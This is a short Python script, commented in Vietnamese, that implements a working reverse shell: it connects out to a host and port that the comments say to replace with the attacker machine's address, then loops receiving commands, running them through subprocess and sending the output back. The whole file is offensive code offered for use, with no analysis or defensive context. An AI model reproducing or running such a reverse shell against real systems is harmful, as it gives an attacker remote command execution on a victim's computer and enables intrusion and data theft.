import socket
import subprocess

def reverse_shell():
    # Địa chỉ IP và cổng của máy tấn công
    host = '127.0.0.1'  # Thay thế bằng IP của máy tấn công
    port = 12345  # Thay thế bằng cổng phù hợp

    # Tạo socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    while True:
        # Nhận lệnh từ máy tấn công
        command = s.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break

        # Thực thi lệnh và gửi kết quả trở lại máy tấn công
        output = subprocess.getoutput(command)
        s.send(output.encode('utf-8'))

    s.close()

if __name__ == "__main__":
    reverse_shell()
